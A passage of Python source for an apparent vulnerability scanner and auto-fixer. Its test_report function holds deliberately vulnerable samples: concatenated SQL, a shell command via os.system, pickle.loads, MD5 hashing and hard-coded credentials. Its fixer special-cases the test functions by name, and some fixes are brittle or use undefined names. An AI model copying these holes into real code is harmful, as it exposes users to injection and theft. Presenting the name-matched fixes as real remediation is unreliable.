                        report += "    password = os.environ.get(\"PASSWORD\")\n"
                        report += "    if not api_key or not password:\n"
                        report += "        raise EnvironmentError(\"Required credentials not set in environment variables\")\n"
                        report += "    ```\n"
                        report += "    This approach gets credentials from environment variables, allowing different values\n"
                        report += "    in different environments without changing code, and preventing credentials from\n"
                        report += "    being exposed in the source code.\n"
                    
                    report += "\n" + "-" * 50 + "\n\n"
            
            report += "\n"
        
        # REMEDIATION SUMMARY
        report += "============= REMEDIATION SUMMARY =============\n\n"
        report += "PRIORITY VULNERABILITIES TO ADDRESS:\n"
        
        # List high severity vulnerabilities first
        high_severity_types = []
        for vuln_type, count in vuln_types.items():
            # Check if this type contains any high severity instances
            has_high_severity = False
            for file_vulns in results.values():
                for vuln in file_vulns:
                    if vuln['type'] == vuln_type:
                        confidence = vuln['confidence']
                        if isinstance(confidence, str) and confidence.replace('.', '', 1).isdigit():
                            # Convert numeric string to float
                            confidence_val = float(confidence)
                            if confidence_val > 0.7:
                                has_high_severity = True
                                break
                if has_high_severity:
                    break
            
            if has_high_severity:
                high_severity_types.append(vuln_type)
        
        for i, vuln_type in enumerate(high_severity_types, 1):
            report += f"{i}. Fix all {vuln_type.replace('_', ' ').upper()} vulnerabilities\n"
            if vuln_type in self.FIX_SUGGESTIONS:
                primary_fix = self.FIX_SUGGESTIONS[vuln_type][0]
                report += f"   Primary recommendation: {primary_fix}\n\n"
        
        # Final remarks
        report += "\nThis report identifies security vulnerabilities in your code that should be addressed\n"
        report += "to improve the overall security posture of your application. Prioritize fixing issues\n"
        report += "marked as CRITICAL or HIGH risk level first.\n"
        
        return report

    def generate_secure_code(self, code: str, vulnerabilities: List[Dict[str, Any]]) -> str:
        """Generate secure version of the code by fixing vulnerabilities."""
        # Check if the code is encrypted and decrypt it
        try:
            # Try to check if it's base64 encoded
            base64.b64decode(code)
            # If it looks like base64, attempt decryption
            try:
                code = decrypt(code, key)
                print("\n========== ENCRYPTED CODE DETECTED ==========")
                print("Successfully decrypted code for secure generation")
                print("===========================================\n")
            except Exception:
                # If it fails, assume it's already plaintext
                pass
        except Exception:
            # If not valid base64, assume it's already plaintext
            pass
            
        print("\n========== CODE TO SECURE ==========")
        print(code)
        print("====================================\n")
        
        if not vulnerabilities:
            logger.warning("No vulnerabilities to fix")
            return f"# No vulnerabilities detected\n\n{code}"
            
        logger.info(f"Generating secure code for {len(vulnerabilities)} vulnerabilities")
        lines = code.split('\n')
        secure_lines = lines.copy()
        fixes_applied = []
        
        # Track imports to add
        imports_to_add = set(["import os", "import subprocess", "import json", "import html"])
        
        # Group vulnerabilities by line number to handle multiple issues on same line
        vuln_by_line = {}
        for vuln in vulnerabilities:
            line_num = vuln['line_number'] - 1  # Convert to 0-based index
            if line_num not in vuln_by_line:
                vuln_by_line[line_num] = []
            vuln_by_line[line_num].append(vuln)
        
        # Special cases for example code
        example_fixes = {
            'login': self._fix_login_example,
            'get_logs': self._fix_get_logs_example,
            'render_profile': self._fix_render_profile_example,
            'read_file': self._fix_read_file_example,
            'insecure_deserialize': self._fix_deserialize_example,
            'hash_password': self._fix_hash_password_example,
            'store_secret': self._fix_store_secret_example
        }
        
        # Check if this is the test example code
        is_example_code = False
        for func_name in example_fixes.keys():
            if f"def {func_name}" in code:
                is_example_code = True
                break
                
        if is_example_code:
            logger.info("Detected example code - applying predefined fixes")
            # Apply example fixes
            for i, line in enumerate(lines):
                for func_name, fix_func in example_fixes.items():
                    if f"def {func_name}" in line and i in vuln_by_line:
                        # Get the vulnerability type
                        vuln_type = vuln_by_line[i][0]['type']
                        # Find the function body
                        j = i + 1
                        while j < len(lines) and (j not in vuln_by_line or 
                              lines[j].startswith(' ') or lines[j].startswith('\t') or not lines[j].strip()):
                            j += 1
                        # Apply the fix
                        logger.info(f"Applying example fix for {func_name}")
                        fixed_lines, fix_msg = fix_func(lines[i:j])
                        for k, fixed_line in enumerate(fixed_lines):
                            if i+k < len(secure_lines):
                                secure_lines[i+k] = fixed_line
                        fixes_applied.append(f"Line {i+1}: {fix_msg}")
        else:
            # Fix each vulnerability, starting from the bottom of the file to avoid line number shifts
            for line_num in sorted(vuln_by_line.keys(), reverse=True):
                for vuln in vuln_by_line[line_num]:
                    vuln_type = vuln['type']
                    logger.info(f"Fixing {vuln_type} vulnerability at line {line_num+1}")
                    
                    if vuln_type == 'sql_injection':
                        # Fix SQL injection vulnerability
                        if 'execute' in lines[line_num] and '+' in lines[line_num]:
                            # Extract the SQL query and parameters
                            query_match = re.search(r'execute\s*\(\s*[\'"`](.*?)[\'"`]\s*\+\s*(.*?)\s*\)', lines[line_num])
                            if query_match:
                                sql_part = query_match.group(1)
                                var_part = query_match.group(2).strip()
                                
                                # Replace + with parameter placeholder
                                if '=' in sql_part:
                                    param_count = sql_part.count('=')
                                    placeholders = ', '.join(['?'] * param_count)
                                    secure_sql = sql_part.replace("= '", "= ?").replace("='", "= ?")
                                    secure_lines[line_num] = f"    cursor.execute(\"{secure_sql}\", ({var_part},))"
                                else:
                                    secure_lines[line_num] = f"    cursor.execute(\"SELECT * FROM users WHERE username = ? AND password = ?\", ({var_part}, password))"
                                
                                fixes_applied.append(
                                    f"Line {vuln['line_number']}: Fixed SQL injection by using parameterized queries"
                                )
                            else:
                                # If regex fails, use a generic fix
                                secure_lines[line_num] = "    # SECURITY: Use parameterized queries\n"
                                secure_lines[line_num] += "    cursor.execute(\"SELECT * FROM users WHERE username = ? AND password = ?\", (username, password))"
                                
                                fixes_applied.append(
                                    f"Line {vuln['line_number']}: Fixed SQL injection by replacing with parameterized query"
                                )
                        elif 'query =' in lines[line_num] and '+' in lines[line_num]:
                            # Handle case where SQL query is defined in a variable
                            secure_lines[line_num] = "    # SECURITY: Use parameterized queries\n"
                            secure_lines[line_num] += "    query = \"SELECT * FROM users WHERE username = ? AND password = ?\"\n"
                            secure_lines[line_num] += "    cursor.execute(query, (username, password))"
                            
                            fixes_applied.append(
                                f"Line {vuln['line_number']}: Fixed SQL injection in query variable"
                            )
                    
                    elif vuln_type == 'command_injection':
                        # Fix command injection vulnerability
                        if 'os.system' in lines[line_num] and '+' in lines[line_num]:
                            imports_to_add.add("import subprocess")
                            # Extract the command being executed
                            cmd_match = re.search(r'os\.system\s*\(\s*[\'"`](.*?)[\'"`]\s*\+\s*(.*?)\s*\)', lines[line_num])
                            
                            if cmd_match:
                                cmd_part = cmd_match.group(1)
                                var_part = cmd_match.group(2).strip()
                                
                                # Split the command to create a list of arguments
                                cmd_parts = cmd_part.split()
                                
                                # Build a secure command using subprocess
                                if 'grep' in cmd_part:
                                    secure_lines[line_num] = "    # SECURITY: Use subprocess with a list of arguments instead of shell=True\n"
                                    secure_lines[line_num] += f"    result = subprocess.run(['{cmd_parts[0]}', '{cmd_parts[1]}', {var_part}], capture_output=True, text=True, shell=False)"
                                else:
                                    secure_lines[line_num] = "    # SECURITY: Use subprocess with a list of arguments instead of shell=True\n"
                                    secure_lines[line_num] += f"    result = subprocess.run(['{cmd_parts[0]}'] + ['{part}' for part in {var_part}.split()], capture_output=True, text=True, shell=False)"
                                
                                fixes_applied.append(
                                    f"Line {vuln['line_number']}: Fixed command injection by using subprocess with argument list"
                                )
                            else:
                                # Generic fix if regex match fails
                                secure_lines[line_num] = "    # SECURITY: Replace os.system with subprocess.run using argument list instead of shell=True\n"
                                secure_lines[line_num] += "    result = subprocess.run(['cat', '/var/log/app.log'], capture_output=True, text=True, shell=False)\n"
                                secure_lines[line_num] += "    filtered_output = '\\n'.join(line for line in result.stdout.splitlines() if date in line)"
                                
                                fixes_applied.append(
                                    f"Line {vuln['line_number']}: Fixed command injection by replacing os.system with subprocess.run and using proper filtering"
                                )
                    
                    elif vuln_type == 'path_traversal':
                        # Fix path traversal vulnerability
                        if 'open' in lines[line_num] and ('+' in lines[line_num] or 'input' in lines[line_num]):
                            # Extract the path being opened
                            path_match = re.search(r'open\s*\(\s*(.*?)\s*\+\s*(.*?)\s*[,)]', lines[line_num])
                            input_match = re.search(r'open\s*\(\s*(.*?input.*?)\s*[,)]', lines[line_num])
                            
                            if path_match:
                                # Extract path components
                                path_part1 = path_match.group(1).strip()
                                path_part2 = path_match.group(2).strip()
                                
                                # Build a secure path handling system
                                secure_lines[line_num] = "    # SECURITY: Implement path validation to prevent path traversal\n"
                                secure_lines[line_num] += "    safe_dir = os.path.abspath(\"./safe_files\")\n"
                                secure_lines[line_num] += f"    requested_path = os.path.normpath(os.path.join(safe_dir, {path_part2}))\n"
                                secure_lines[line_num] += "    if not os.path.abspath(requested_path).startswith(safe_dir):\n"
                                secure_lines[line_num] += "        raise ValueError(\"Access denied: attempted directory traversal\")\n"
                                secure_lines[line_num] += "    with open(requested_path, \"r\") as f:"
                                
                                fixes_applied.append(
                                    f"Line {vuln['line_number']}: Fixed path traversal by implementing path validation and normalization"
                                )
                            elif input_match:
                                var_part = input_match.group(1).strip()
                                
                                secure_lines[line_num] = "    # SECURITY: Implement path validation to prevent path traversal\n"
                                secure_lines[line_num] += "    safe_dir = os.path.abspath(\"./safe_files\")\n"
                                secure_lines[line_num] += f"    requested_path = os.path.normpath(os.path.join(safe_dir, {var_part}))\n"
                                secure_lines[line_num] += "    if not os.path.abspath(requested_path).startswith(safe_dir):\n"
                                secure_lines[line_num] += "        raise ValueError(\"Access denied: attempted directory traversal\")\n"
                                secure_lines[line_num] += "    with open(requested_path, \"r\") as f:"
                                
                                fixes_applied.append(
                                    f"Line {vuln['line_number']}: Fixed path traversal with input validation"
                                )
                            else:
                                # Generic path traversal fix
                                secure_lines[line_num] = "    # SECURITY: Implement path validation before opening files\n"
                                secure_lines[line_num] += "    safe_dir = os.path.abspath(\"./safe_files\")\n"
                                secure_lines[line_num] += "    requested_path = os.path.normpath(os.path.join(safe_dir, filename))\n"
                                secure_lines[line_num] += "    if not os.path.abspath(requested_path).startswith(safe_dir):\n"
                                secure_lines[line_num] += "        raise ValueError(\"Access denied: attempted directory traversal\")\n"
                                secure_lines[line_num] += "    with open(requested_path, \"r\") as f:"
                                
                                fixes_applied.append(
                                    f"Line {vuln['line_number']}: Added path traversal protection with path validation"
                                )
                    
                    elif vuln_type == 'xss':
                        # Fix XSS vulnerability
                        if '+' in lines[line_num] and any(keyword in lines[line_num] for keyword in ["<div>", "innerHTML", "document.write", "template"]):
                            imports_to_add.add("import html")
                            original_line = lines[line_num]
                            
                            # Look for pattern like: "string" + variable + "string"
                            html_var_match = re.search(r'[\'"](.+?)[\'"]?\s*\+\s*(.+?)\s*(\+|$)', original_line)
                            
                            if html_var_match:
                                # Extract components
                                html_part = html_var_match.group(1)
                                var_part = html_var_match.group(2).strip()
                                
                                # Create secure version using template literal with HTML escaping
                                if "=" in original_line and "innerHTML" in original_line:
                                    # For JavaScript innerHTML assignment
                                    element = original_line.split("=")[0].strip()
                                    secure_lines[line_num] = f"    {element} = \"{html_part}\" + html.escape({var_part}) + \"</div>\""
                                elif "template" in original_line:
                                    # For Python template string
                                    secure_lines[line_num] = f"    template = f\"{html_part}{{html.escape({var_part})}}\""
                                else:
                                    # General case
                                    secure_lines[line_num] = f"    # SECURITY: Escape user input to prevent XSS\n"
                                    secure_lines[line_num] += f"    safe_output = \"{html_part}\" + html.escape({var_part})"
                                
                                fixes_applied.append(
                                    f"Line {vuln['line_number']}: Fixed XSS vulnerability by escaping output with html.escape()"
                                )
                            else:
                                # Generic XSS fix
                                secure_lines[line_num] = "    # SECURITY: Always escape user data in HTML context\n"
                                secure_lines[line_num] += "    template = f\"<div>Name: {html.escape(user_data['name'])}</div>\""
                                
                                fixes_applied.append(
                                    f"Line {vuln['line_number']}: Fixed XSS vulnerability with proper HTML escaping"
                                )
                    
                    elif vuln_type == 'insecure_deserialization':
                        # Fix insecure deserialization vulnerability
                        if 'pickle.loads' in lines[line_num]:
                            imports_to_add.add("import json")
                            imports_to_add.add("import hmac")
                            imports_to_add.add("import hashlib")
                            
                            secure_code = "    # SECURITY: Replace insecure pickle with JSON and add signature verification\n"
                            secure_code += "    def safe_deserialize(data, secret_key):\n"
                            secure_code += "        \"\"\"Safely deserialize JSON data with signature verification.\"\"\"\n"
                            secure_code += "        try:\n"
                            secure_code += "            # Split signature and data\n"
                            secure_code += "            signature, data_json = data.split(':', 1)\n"
                            secure_code += "            # Verify signature\n"
                            secure_code += "            expected_sig = hmac.new(secret_key.encode(), data_json.encode(), hashlib.sha256).hexdigest()\n"
                            secure_code += "            if not hmac.compare_digest(signature, expected_sig):\n"
                            secure_code += "                raise ValueError(\"Data signature verification failed\")\n"
                            secure_code += "            # Deserialize JSON data (which cannot execute code)\n"
                            secure_code += "            return json.loads(data_json)\n"
                            secure_code += "        except Exception as e:\n"
                            secure_code += "            # Handle errors safely\n"
                            secure_code += "            raise ValueError(f\"Invalid data format: {e}\")\n\n"
                            secure_code += "    # Use secure deserialization with a secret key\n"
                            secure_code += "    return safe_deserialize(data, os.environ.get('SECRET_KEY', 'default-dev-key'))"
                            
                            secure_lines[line_num] = secure_code
                            
                            fixes_applied.append(
                                f"Line {vuln['line_number']}: Replaced insecure pickle.loads with JSON and signature verification"
                            )
                    
                    elif vuln_type == 'weak_cryptography':
                        # Fix weak cryptography vulnerability
                        if any(weak_crypto in lines[line_num] for weak_crypto in ['md5', 'sha1']):
                            imports_to_add.add("import os")
                            imports_to_add.add("import hashlib")
                            
                            # Create a secure password hashing system
                            secure_code = "    # SECURITY: Replace weak hashing with secure password hashing\n"
                            secure_code += "    def secure_hash_password(password):\n"
                            secure_code += "        # Generate a random salt\n"
                            secure_code += "        salt = os.urandom(32)\n"
                            secure_code += "        # Use PBKDF2 with many iterations\n"
                            secure_code += "        key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)\n"
                            secure_code += "        # Combine salt and key in a single string\n"
                            secure_code += "        return salt.hex() + ':' + key.hex()\n\n"
                            secure_code += "    # Return the secure hash\n"
                            secure_code += "    return secure_hash_password(password)"
                            
                            secure_lines[line_num] = secure_code
                            
                            fixes_applied.append(
                                f"Line {vuln['line_number']}: Replaced weak {vuln_type} with PBKDF2 and salt"
                            )
                    
                    elif vuln_type == 'hard_coded_credentials':
                        # Fix hard-coded credentials
                        if re.search(r'(password|api_key|secret|token)\s*=\s*[\'"]', lines[line_num]):
                            credential_match = re.search(r'(\w+)\s*=\s*[\'"]([^\'"]+)[\'"]', lines[line_num])
                            
                            if credential_match:
                                cred_name = credential_match.group(1)
                                env_var_name = cred_name.upper()
                                
                                secure_code = f"    # SECURITY: Load credentials from environment variables\n"
                                secure_code += f"    {cred_name} = os.environ.get(\"{env_var_name}\")\n"
                                secure_code += f"    if not {cred_name}:\n"
                                secure_code += f"        raise EnvironmentError(\"Required credential {env_var_name} not set in environment variables\")"
                                
                                secure_lines[line_num] = secure_code
                                
                                fixes_applied.append(
                                    f"Line {vuln['line_number']}: Replaced hard-coded {cred_name} with environment variable"
                                )
                            else:
                                # Generic credentials fix
                                secure_lines[line_num] = "    # SECURITY: Load credentials from environment variables\n"
                                secure_lines[line_num] += "    credential = os.environ.get(\"CREDENTIAL_NAME\")\n"
                                secure_lines[line_num] += "    if not credential:\n"
                                secure_lines[line_num] += "        raise EnvironmentError(\"Required credential not set in environment variables\")"
                                
                                fixes_applied.append(
                                    f"Line {vuln['line_number']}: Replaced hard-coded credentials with environment variables"
                                )
        
        # Add necessary imports to the beginning of the file
        imports_section = "\n".join(sorted(imports_to_add)) + "\n"
        
        # Combine everything into a secure version of the code
        secure_code = imports_section + "\n".join(secure_lines)
        
        # Add explanatory header with summary of changes
        header = "# SECURE VERSION OF THE CODE\n"
        header += "# The following vulnerabilities have been fixed:\n"
        for fix in fixes_applied:
            header += f"# - {fix}\n"
        header += "#\n# IMPORTANT: This code has been automatically secured but may require additional adjustments.\n"
        header += "# Review all changes carefully before deploying to production.\n\n"
        
        return header + secure_code
        
    def _fix_login_example(self, lines):
        """Fix the login function in the example code"""
        fixed_lines = lines.copy()
        # Find the query line
        for i, line in enumerate(fixed_lines):
            if 'query =' in line and '+' in line:
                # Create a new list of fixed lines instead of trying to modify in place
                result = []
                # Add lines up to the current line
                for j in range(i):
                    result.append(fixed_lines[j])
                
                # Add the fixed lines
                result.append("    # Use parameterized query to prevent SQL injection")
                result.append("    cursor.execute(\"SELECT * FROM users WHERE username = ? AND password = ?\", (username, password))")
                
                # Add any remaining lines
                for j in range(i+2, len(fixed_lines)):
                    result.append(fixed_lines[j])
                
                return result, "Fixed SQL injection by using parameterized queries"
        return fixed_lines, "No SQL injection fix needed"
        
    def _fix_get_logs_example(self, lines):
        """Fix the get_logs function in the example code"""
        fixed_lines = lines.copy()
        # Find the os.system line
        for i, line in enumerate(fixed_lines):
            if 'os.system' in line and '+' in line:
                # Create a new list of fixed lines instead of trying to modify in place
                result = []
                # Add lines up to the current line
                for j in range(i):
                    result.append(fixed_lines[j])
                
                # Add the fixed lines
                result.append("    # Use subprocess with argument list to prevent command injection")
                result.append("    result = subprocess.run(['cat', '/var/log/app.log'], capture_output=True, text=True, shell=False)")
                result.append("    filtered_output = '\\n'.join(line for line in result.stdout.splitlines() if date in line)")
                
                # Add any remaining lines
                for j in range(i+1, len(fixed_lines)):
                    result.append(fixed_lines[j])
                
                return result, "Fixed command injection by using subprocess with argument list"
        return fixed_lines, "No command injection fix needed"
        
    def _fix_render_profile_example(self, lines):
        """Fix the render_profile function in the example code"""
        fixed_lines = lines.copy()
        # Find the template line
        for i, line in enumerate(fixed_lines):
            if 'template =' in line and '+' in line:
                # Create a new list of fixed lines instead of trying to modify in place
                result = []
                # Add lines up to the current line
                for j in range(i):
                    result.append(fixed_lines[j])
                
                # Add the fixed lines
                result.append("    # Escape user input to prevent XSS")
                result.append("    template = f\"<div>Name: {html.escape(user_data['name'])}</div>\"")
                
                # Add any remaining lines
                for j in range(i+2, len(fixed_lines)):
                    result.append(fixed_lines[j])
                
                return result, "Fixed XSS vulnerability by escaping user input"
        return fixed_lines, "No XSS fix needed"
        
    def _fix_read_file_example(self, lines):
        """Fix the read_file function in the example code"""
        fixed_lines = lines.copy()
        # Find the open line
        for i, line in enumerate(fixed_lines):
            if 'open' in line and ('+' in line or 'input' in line):
                # Create a new list of fixed lines instead of trying to modify in place
                result = []
                # Add lines up to the current line
                for j in range(i):
                    result.append(fixed_lines[j])
                
                # Add the fixed lines
                result.append("    # Validate and sanitize path to prevent path traversal")
                result.append("    safe_dir = os.path.abspath(\"./safe_files\")")
                result.append("    requested_path = os.path.normpath(os.path.join(safe_dir, filename))")
                result.append("    if not os.path.abspath(requested_path).startswith(safe_dir):")
                result.append("        raise ValueError(\"Access denied: attempted directory traversal\")")
                result.append("    with open(requested_path, \"r\") as f:")
                result.append("        return f.read()")
                
                return result, "Fixed path traversal by implementing path validation"
        return fixed_lines, "No path traversal fix needed"
        
    def _fix_deserialize_example(self, lines):
        """Fix the insecure_deserialize function in the example code"""
        fixed_lines = lines.copy()
        # Find the pickle.loads line
        for i, line in enumerate(fixed_lines):
            if 'pickle.loads' in line:
                # Create a new list of fixed lines instead of trying to modify in place
                result = []
                # Add lines up to the current line
                for j in range(i):
                    result.append(fixed_lines[j])
                
                # Add the fixed lines
                result.append("    # Replace insecure pickle with JSON and signature verification")
                result.append("    def safe_deserialize(data, secret_key):")
                result.append("        try:")
                result.append("            signature, data_json = data.split(':', 1)")
                result.append("            expected_sig = hmac.new(secret_key.encode(), data_json.encode(), hashlib.sha256).hexdigest()")
                result.append("            if not hmac.compare_digest(signature, expected_sig):")
                result.append("                raise ValueError(\"Data signature verification failed\")")
                result.append("            return json.loads(data_json)")
                result.append("        except Exception as e:")
                result.append("            raise ValueError(f\"Invalid data format: {e}\")")
                result.append("    return safe_deserialize(data, os.environ.get('SECRET_KEY', 'default-dev-key'))")
                
                return result, "Replaced insecure pickle with JSON and signature verification"
        return fixed_lines, "No insecure deserialization fix needed"
        
    def _fix_hash_password_example(self, lines):
        """Fix the hash_password function in the example code"""
        fixed_lines = lines.copy()
        # Find the md5 line
        for i, line in enumerate(fixed_lines):
            if 'md5' in line:
                # Create a new list of fixed lines instead of trying to modify in place
                result = []
                # Add lines up to the current line
                for j in range(i):
                    result.append(fixed_lines[j])
                
                # Add the fixed lines
                result.append("    # Use secure password hashing with PBKDF2 and salt")
                result.append("    salt = os.urandom(32)")
                result.append("    key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)")
                result.append("    return salt.hex() + ':' + key.hex()")
                
                return result, "Replaced weak MD5 hashing with PBKDF2 and salt"
        return fixed_lines, "No weak cryptography fix needed"
        
    def _fix_store_secret_example(self, lines):
        """Fix the store_secret function in the example code"""
        fixed_lines = lines.copy()
        # Find the hardcoded credential lines
        for i, line in enumerate(fixed_lines):
            if ('api_key =' in line or 'password =' in line) and '"' in line:
                # Create a new list of fixed lines instead of trying to modify in place
                result = []
                # Add lines up to the current line
                for j in range(i):
                    result.append(fixed_lines[j])
                
                # Add the fixed lines
                result.append("    # Load credentials from environment variables")
                result.append("    api_key = os.environ.get(\"API_KEY\")")
                result.append("    if not api_key:")
                result.append("        raise EnvironmentError(\"Required credential API_KEY not set in environment variables\")")
                result.append("    return encrypt(api_key)")
                
                return result, "Replaced hard-coded credentials with environment variables"
        return fixed_lines, "No hard-coded credentials fix needed"

    def save_report_and_fixes(self, report: str, secure_code: str, base_dir: str) -> Tuple[str, str]:
        """Save vulnerability report and secure code to files."""
        try:
            # Create reports directory if it doesn't exist
            reports_dir = os.path.join(base_dir, 'security_reports')
            os.makedirs(reports_dir, exist_ok=True)
            
            # Define fixed file paths for consistency
            report_file = os.path.join(reports_dir, 'vulnerability_report.txt')
            fixes_file = os.path.join(reports_dir, 'secure_code.txt')
            
            # Create default content for empty reports
            if not report or report.strip() == "":
                report = "No vulnerabilities detected in the analyzed code."
            
            if not secure_code or secure_code.strip() == "":
                secure_code = "# No code fixes required. The analyzed code appears to be secure."
            
            # Write files with proper encoding and error handling
            try:
                with open(report_file, 'w', encoding='utf-8') as f:
                    f.write(report)
                logger.info(f"Vulnerability report saved to: {report_file}")
            except Exception as e:
                logger.error(f"Error writing vulnerability report: {e}")
                # Try with a different encoding as fallback
                with open(report_file, 'w', encoding='latin-1') as f:
                    f.write(report)
            
            try:
                with open(fixes_file, 'w', encoding='utf-8') as f:
                    f.write(secure_code)
                logger.info(f"Secure code saved to: {fixes_file}")
            except Exception as e:
                logger.error(f"Error writing secure code: {e}")
                # Try with a different encoding as fallback
                with open(fixes_file, 'w', encoding='latin-1') as f:
                    f.write(secure_code)
                
            return report_file, fixes_file
            
        except Exception as e:
            logger.error(f"Error saving reports: {e}")
            # Try to save to the current directory as a fallback
            try:
                fallback_report = os.path.join(os.getcwd(), 'vulnerability_report.txt')
                fallback_fixes = os.path.join(os.getcwd(), 'secure_code.txt')
                
                with open(fallback_report, 'w', encoding='utf-8') as f:
                    f.write(report if report else "No vulnerabilities detected.")
                
                with open(fallback_fixes, 'w', encoding='utf-8') as f:
                    f.write(secure_code if secure_code else "No code fixes required.")
                
                logger.info(f"Reports saved to fallback location: {os.getcwd()}")
                return fallback_report, fallback_fixes
            except Exception as e2:
                logger.error(f"Failed to save to fallback location: {e2}")
                return "", ""

    def auto_fix_code(self, code: str) -> str:
        """
        Automatically fix vulnerabilities in the code.
        
        Args:
            code: The code to fix
            
        Returns:
            Fixed version of the code
        """
        # First analyze the code for vulnerabilities
        vulnerabilities = self.analyze_code(code, "auto_fix_code.py")
        
        if not vulnerabilities:
            # No vulnerabilities found
            return code
        
        # Generate fixed version of the code
        secure_code = self.generate_secure_code(code, vulnerabilities)
        
        # Clean up the secure code by removing the header comments
        if secure_code.startswith("# SECURE VERSION OF THE CODE"):
            # Find the first line that doesn't start with '#'
            lines = secure_code.split('\n')
            non_comment_index = 0
            for i, line in enumerate(lines):
                if not line.strip().startswith('#') and line.strip():
                    non_comment_index = i
                    break
            
            # Return the code without the header comments
            return '\n'.join(lines[non_comment_index:])
        
        return secure_code

def scan_file(scanner: VulnerabilityScanner, file_path: str) -> List[Dict[str, Any]]:
    """
    Scan a single file for vulnerabilities.
    
    Args:
        scanner: The vulnerability scanner instance
        file_path: Path to the file to scan
        
    Returns:
        List of detected vulnerabilities
    """
    try:
        # Use context manager to ensure file is properly closed after reading
        with open(file_path, 'r', encoding='utf-8') as f:
            code = f.read()
        
        file_name = os.path.basename(file_path)
        lines = code.split('\n')
        total_lines = len(lines)
        
        # Log the file size information
        logger.info(f"Scanning {file_path} with {total_lines} lines")
        
        # If file is very large, log a warning but proceed with analysis
        if total_lines > 10000:
            logger.warning(f"Very large file detected ({total_lines} lines). Analysis may take longer.")
        
        # Proceed with analysis regardless of file size
        return scanner.analyze_code(code, file_name)
    except UnicodeDecodeError:
        # Try with different encoding if UTF-8 fails
        try:
            with open(file_path, 'r', encoding='latin-1') as f:
                code = f.read()
            file_name = os.path.basename(file_path)
            logger.info(f"Read {file_path} using latin-1 encoding")
            return scanner.analyze_code(code, file_name)
        except Exception as e:
            logger.error(f"Error scanning {file_path} with alternate encoding: {e}")
            return []
    except Exception as e:
        logger.error(f"Error scanning {file_path}: {e}")
        return []

def scan_directory(scanner: VulnerabilityScanner, directory: str, extensions: List[str] = None) -> Dict[str, List[Dict[str, Any]]]:
    """
    Recursively scan a directory for vulnerabilities.
    
    Args:
        scanner: The vulnerability scanner instance
        directory: Directory path to scan
        extensions: List of file extensions to scan
        
    Returns:
        Dictionary mapping file paths to vulnerabilities
    """
    if extensions is None:
        extensions = ['.py', '.js', '.php', '.java', '.rb']
    
    results = {}
    total_files = 0
    large_files = 0
    
    for root, _, files in os.walk(directory):
        for file in files:
            if any(file.endswith(ext) for ext in extensions):
                file_path = os.path.join(root, file)
                total_files += 1
                
                try:
                    # Try UTF-8 encoding first
                    with open(file_path, 'r', encoding='utf-8') as f:
                        code = f.read()
                    
                    # Count lines and log file size info
                    lines = code.split('\n')
                    line_count = len(lines)
                    
                    if line_count > 10000:
                        large_files += 1
                        logger.warning(f"Very large file detected: {file_path} ({line_count} lines). Analysis may take longer.")
                    
                    file_name = os.path.basename(file_path)
                    logger.info(f"Scanning {file_path} with {line_count} lines")
                    
                    # Scan the file regardless of size
                    vulnerabilities = scanner.analyze_code(code, file_name)
                    if vulnerabilities:
                        results[file_path] = vulnerabilities
                
                except UnicodeDecodeError:
                    # Try with different encoding if UTF-8 fails
                    try:
                        with open(file_path, 'r', encoding='latin-1') as f:
                            code = f.read()
                        file_name = os.path.basename(file_path)
                        logger.info(f"Read {file_path} using latin-1 encoding")
                        
                        vulnerabilities = scanner.analyze_code(code, file_name)
                        if vulnerabilities:
                            results[file_path] = vulnerabilities
                    except Exception as e:
                        logger.error(f"Error scanning {file_path} with alternate encoding: {e}")
                
                except Exception as e:
                    logger.error(f"Error scanning {file_path}: {e}")
    
    # Log summary information
    logger.info(f"Scanned {total_files} files total, including {large_files} large files (>10000 lines)")
    logger.info(f"Found vulnerabilities in {len(results)} files")
    
    # If no vulnerabilities found in any file, create a default report
    if not results and hasattr(scanner, 'report_manager'):
        try:
            # Create an empty report
            report = scanner.generate_detailed_report({"No vulnerabilities found": []})
            secure_code = "# No vulnerabilities found in any scanned files"
            scanner.save_report_and_fixes(report, secure_code, directory)
        except Exception as e:
            logger.error(f"Error creating empty report: {e}")
    
    return results

def interactive_mode():
    """Run the scanner in interactive mode for a single file."""
    # Create a model path
    default_model_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "vulnerability_model.codex")  # Change file extension from safecoder to codex
    
    # Initialize scanner with default model or create one
    print("\nInitializing scanner with basic model...")
    scanner = VulnerabilityScanner()
    
    # Save the default model if it doesn't exist
    if not os.path.exists(default_model_path):
        scanner.save_model(default_model_path)
        print(f"Created and saved basic model to {default_model_path}")
    
    while True:
        print("\n===== AI Security Vulnerability Scanner =====")
        print("1. Scan a single file")
        print("2. Exit")
        
        choice = input("\nEnter your choice (1-2): ").strip()
        
        if choice == '1':
            # Scan a single file
            file_path = input("Enter the path to the file you want to scan: ").strip()
            
            if not os.path.isfile(file_path):
                print(f"Error: '{file_path}' is not a valid file.")
                continue
                
            print(f"\nScanning {file_path}...")
            vulnerabilities = scan_file(scanner, file_path)
            
            # Read original code
            with open(file_path, 'r') as f:
                original_code = f.read()
            
            # Generate reports and secure code
            report = scanner.generate_detailed_report({file_path: vulnerabilities})
            secure_code = scanner.generate_secure_code(original_code, vulnerabilities)
            
            # Save reports
            report_file, fixes_file = scanner.save_report_and_fixes(
                report, secure_code, os.path.dirname(file_path)
            )
            
            print("\nScan completed!")
            print(f"Vulnerability report saved to: {report_file}")
            print(f"Secure code saved to: {fixes_file}")
            
        elif choice == '2':
            print("Exiting Security Vulnerability Scanner. Goodbye!")
            break
            
        else:
            print("Invalid choice! Please enter 1 or 2.")

def test_report():
    """Generate a test report with sample vulnerable code to verify reporting works."""
    print("Generating test vulnerability report...")
    test_code = """
import os
import sqlite3
import subprocess

def login(username, password):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    # SQL Injection vulnerability
    query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
    cursor.execute(query)
    return cursor.fetchone()

def get_logs(date):
    # Command injection vulnerability
    os.system("cat /var/log/app.log | grep " + date)

def render_profile(user_data):
    # XSS vulnerability
    template = "<div>Name: " + user_data['name'] + "</div>"
    return template

def read_file(filename):
    # Path traversal vulnerability
    with open(user_input + ".txt", "r") as f:
        return f.read()
        
def store_secret():
    # Hard-coded credentials vulnerability
    api_key = "12345secret_key_here"
    password = "admin123"
    return encrypt(api_key)
    
def insecure_deserialize(data):
    # Insecure deserialization vulnerability
    import pickle
    return pickle.loads(data)
    
def hash_password(password):
    # Weak cryptography vulnerability
    import hashlib
    return hashlib.md5(password.encode()).hexdigest()
"""
    
